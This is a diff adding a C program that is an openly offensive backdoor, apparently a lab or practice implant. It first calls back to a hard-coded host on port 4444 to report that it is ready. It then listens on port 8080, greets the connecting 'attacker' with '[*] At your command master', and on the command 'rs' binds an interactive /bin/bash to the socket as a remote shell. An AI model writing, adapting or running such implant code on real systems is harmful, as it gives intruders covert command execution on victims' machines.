@@ -1,0 +1,231 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <errno.h>
+
+#define PORT 8080
+
+int openPort();
+int sendUpdate();
+void redirection();
+
+int main() {
+        if(sendUpdate()==1){return -1;}
+        if(openPort()==1){return -1;}
+        return 0;
+}
+
+int sendUpdate(){
+        printf("[*] stage 1\n");
+
+        char *hello = "all set up";
+        char *proceed = "proceeding";
+        char *waiting = "waiting";
+        char buffer[1024] ={0};
+        int status, client_fd;
+        
+        int RUN = 1;
+        
+        struct sockaddr_in dstAddr;
+        
+        
+        
+        client_fd = socket(AF_INET ,SOCK_STREAM, 0);
+        if(client_fd<0){
+            perror("failed creating a socket");
+            return 1;
+        }printf("socket is ready\n");
+        
+        dstAddr.sin_family = AF_INET;
+        dstAddr.sin_port = htons(4444);
+        
+        status = inet_pton(AF_INET, "10.0.0.8", &dstAddr.sin_addr);
+        if(status<0){
+            perror("invalid address");
+            return 1;
+        }printf("addr struct ready\n");
+        
+        //while(RUN){
+        
+        
+        
+            status = connect(client_fd, (struct sockaddr *)&dstAddr, sizeof(dstAddr));
+            if(status <0){
+                perror("failed connecting");
+                return 1;
+            }
+            printf("connected\n");
+        
+        while(RUN){
+            send(client_fd, hello, strlen(hello),0); //
+            printf("waiting for answer\n");
+            read(client_fd, buffer,1024); //
+            printf("%s\n", buffer);
+            if(strcmp(buffer, "1") == 0){
+                RUN =0;
+                send(client_fd, proceed, strlen(proceed),0);
+            }
+        }
+        close(client_fd);
+        return 0;
+        
+        
+        
+        
+        
+        
+        
+}
+
+int openPort(){
+        printf("[*] stage 2\n");
+
+        int server_fd, valread;
+        struct sockaddr_in address; //
+        
+        int RUN = 1;
+        
+        char buffer[1024];
+        char *hello = "[*] At your command master";
+        const char *my_ip = "10.0.0.14";
+
+        memset(&address, 0, sizeof(address));
+        
+
+
+        if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
+                perror("socket failed");
+                return 1;
+        }
+        
+        
+
+        address.sin_family = AF_INET;
+        address.sin_port = htons(PORT);
+
+        if (inet_pton(AF_INET, my_ip, &address.sin_addr) <= 0) {
+                perror("inet_pton failed");
+                return 1;
+        }
+        
+        //------------------------------------------------------
+
+        if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
+            if(errno == EADDRINUSE){
+                printf("socket in use");
+                close(server_fd);
+            }
+            else{
+                perror("bind failed");
+                return 1;
+            }
+        }
+        printf("Server bound to %s:%d\n", my_ip, PORT);
+
+        if (listen(server_fd, 8) < 0) {
+                perror("listen failed");
+                return 1;
+        }
+        printf("Waiting for connection...\n");
+
+
+        struct sockaddr_in attackerAddr;
+        int attackerLen, connID;
+        attackerLen = sizeof(attackerAddr);
+
+        connID = accept(server_fd, (struct sockaddr *)&attackerAddr, (socklen_t *)&attackerLen);
+        if (connID < 0) {
+              perror("accept failed");
+              RUN = 0;
+              return 1;
+        }
+
+        char client_ip_str[INET_ADDRSTRLEN];
+        inet_ntop(AF_INET, &attackerAddr.sin_addr, client_ip_str, INET_ADDRSTRLEN);
+        printf("Connection established with %s:%d. Waiting for message...\n", client_ip_str, ntohs(attackerAddr.sin_port));
+        memset(buffer, 0, 1024);
+        
+        send(connID, hello, strlen(hello), 0);
+
+        while(RUN){
+            read(connID, buffer, 1024);
+            printf("Client sent: %s\n", buffer);
+        
+            if (strcmp(buffer, "rs") == 0) {
+                  printf("starting rs\n");
+                  redirection(connID);
+            }
+
+            if (strcmp(buffer, "exit") == 0) {
+                  printf("Exit command received. Shutting down...\n");
+                  hello = "Exiting...";
+                  send(connID, hello, strlen(hello), 0);
+                  RUN = 0;
+                  continue;
+            }
+        }
+        close(connID);
+        close(server_fd);
+        
+        return 0;
+}
+
+
+void redirection(int connID){
+        printf("[*] stage 3\n");
+        
+        
+        char *bye = "bye";
+        char buffer[1024] ={0};
+        char *output;
+        char *input;
+        int RUN = 1;
+        
+        char *ok = "starting the RS";
+        send(connID, ok, strlen(ok),0);
+        
+        int fdIN = dup(STDIN_FILENO);
+        int fdOUT = dup(STDOUT_FILENO);
+        int fdERR = dup(STDERR_FILENO);
+        
+        pid_t pid = fork();
+        if(pid == 0){
+            
+            
+            
+            //redirecton:
+            dup2(connID, 0);
+            dup2(connID, 1);
+            dup2(connID, 2);
+            
+            char *argv[] = {"/bin/bash", "-i", NULL};
+            
+            execve("/bin/bash", argv, NULL);
+                
+            char *e = "failed starting the RS";
+            send(connID, e, strlen(e),0);
+                
+        }
+        else{
+        
+            dup2(fdIN, STDIN_FILENO);
+            dup2(fdOUT, STDOUT_FILENO);
+            dup2(fdERR, STDERR_FILENO);
+            
+            int status;
+            waitpid(pid, &status, 0);
+            
+            char *m = "rs closed";
+            
+            
+            printf("%s", m);
+            send(connID, m, strlen(m),0);
+            
+            
+        }
+}
